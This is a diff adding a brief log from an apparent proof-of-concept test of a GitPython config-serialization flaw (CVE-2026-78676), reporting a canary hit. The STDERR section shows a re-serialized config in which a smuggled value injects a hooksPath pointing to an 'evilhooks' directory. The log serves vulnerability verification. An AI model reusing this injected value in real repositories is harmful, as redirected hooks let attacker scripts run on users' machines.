@@ -1,0 +1,14 @@
+exit_code=0 timed_out=False oracle_hit=True
+detail: canary observed
+STDOUT:
+POC_dafddf4fe211a8050209dbdd_OK
+
+STDERR:
+[poc] re-serialized config:
+[core]
+	dummyvar = starthooksPath = /tmp/poc_cve_2026_78676_o7cdgbgk/evilhooks
+[user]
+	name = poc
+
+[poc] installed GitPython version='3.1.58' parsed=(3, 1, 58) source=metadata:GitPython
+[poc] vulnerable serializer present (version < 3.1.59) -> emitting canary
